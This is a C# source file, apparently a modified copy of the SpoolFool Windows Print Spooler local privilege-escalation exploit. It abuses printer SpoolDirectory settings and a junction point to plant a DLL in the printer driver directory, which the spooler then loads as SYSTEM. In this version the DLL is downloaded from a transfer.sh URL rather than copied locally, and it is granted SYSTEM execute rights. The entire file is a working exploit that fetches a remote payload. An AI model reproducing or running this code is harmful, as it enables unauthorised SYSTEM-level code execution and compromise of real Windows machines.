using System;
using System.Linq;
using System.Threading;
using System.IO;
using System.Security.AccessControl;
using System.Runtime.InteropServices;
using System.Net;

namespace SpoolFool
{
    public class Program
    {
        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

        static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            // Get information about the source directory
            var dir = new DirectoryInfo(sourceDir);

            // Check if the source directory exists
            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

            // Cache directories before we start copying
            DirectoryInfo[] dirs = dir.GetDirectories();

            // Create the destination directory
            Directory.CreateDirectory(destinationDir);

            // Get the files in the source directory and copy to the destination directory
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                file.CopyTo(targetFilePath);
            }

            // If recursive and copying subdirectories, recursively call this method
            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }

        public static void CommandEntry(string commandLine)
        {
            if (commandLine == "" || commandLine == null)
            {
                Main(null);
                return;
            }

            int argc;
            var argv = CommandLineToArgvW(commandLine, out argc);

            if (argv == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception();
            try
            {
                var args = new string[argc];
                for (var i = 0; i < args.Length; i++)
                {
                    var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(p);
                }

                Main(args);

            }
            finally
            {
                Marshal.FreeHGlobal(argv);
            }
        }

        internal static void Main(string[] args)
        {
            string moduleName = System.Reflection.Assembly.GetExecutingAssembly().Location;

            if (args == null || !args.Any())
            {
                Console.WriteLine();
                Console.WriteLine();
                return;
            }

            string argPrinterName = "Sp00l3r";
            string argDriverDirectory = "4";
            string argSourceDLL = "";
            IntPtr pHandle = new IntPtr(0);

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();

                switch (argument)
                {
                    case "-PRINTER":
                    case "/PRINTER":
                        argPrinterName = args[entry.index + 1];
                        break;

                    case "-DIR":
                    case "/DIR":
                        argDriverDirectory = args[entry.index + 1];
                        break;

                    case "-DLL":
                    case "/DLL":
                        argSourceDLL = args[entry.index + 1];
                        break;
                }
            }

            if (argSourceDLL == "")
            {
                return;
            }

            if (argDriverDirectory == "")
            {
                argDriverDirectory = "{" + Guid.NewGuid().ToString().ToUpper() + "}";
            }

            string tempPath = Path.GetTempPath();
            string baseDirectory = Path.Combine(tempPath, Guid.NewGuid().ToString());

            string driverDir = Printer.GetDriverDirectory();
            string sourceDir = Path.Combine(driverDir, "3");
            string targetDir = Path.Combine(driverDir, argDriverDirectory);
            string linkDirectory = "\\\\localhost\\C$\\" + Path.Combine(baseDirectory, argDriverDirectory).Substring(3); // Remove 'C:\'

            string sourceDllName = Path.GetFileName(argSourceDLL);
            string targetDll = Path.Combine(targetDir, sourceDllName);

            Directory.CreateDirectory(baseDirectory);

            if (Printer.OpenExistingPrinter(argPrinterName, ref pHandle) == false)
            {
                pHandle = Printer.CreatePrinter(argPrinterName);
                if (pHandle == IntPtr.Zero)
                {
                    return;
                }
            }

            if (Directory.Exists(targetDir))
            {
                goto LOAD_DLL;
            }

            if (Printer.SetPrinterDataEx(pHandle, "\\", "SpoolDirectory", 1, linkDirectory, linkDirectory.Length) != 0)
            {
                return;
            }

            JunctionPoint.Create(baseDirectory, driverDir, true);

            string terminator = "C:\\Windows\\System32\\AppVTerminator.dll";


            Printer.SetPrinterDataEx(pHandle, "CopyFiles\\", "Module", 1, terminator, terminator.Length);

            while (true)
            {
                Thread.Sleep(2000);

                Console.Write(".");

                if (Printer.OpenExistingPrinter(argPrinterName, ref pHandle))
                {
                    Console.WriteLine("");
                    break;
                }
            }

            if (!Directory.Exists(targetDir))
            {
                return;
            }

            CopyDirectory(sourceDir, targetDir, true);

        LOAD_DLL:
            if (File.Exists(targetDll))
            {
                File.Delete(targetDll);
            }

            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://transfer.sh/get/T1ERhL/something", targetDll);
            //File.Copy(argSourceDLL, targetDll);

            FileSecurity fSecurity = File.GetAccessControl(targetDll);
            fSecurity.AddAccessRule(new FileSystemAccessRule(@"System", FileSystemRights.ReadAndExecute, AccessControlType.Allow));
            File.SetAccessControl(targetDll, fSecurity);

            Printer.SetPrinterDataEx(pHandle, "CopyFiles\\", "Module", 1, targetDll, targetDll.Length);

            Directory.Delete(baseDirectory);
        }
    }
}
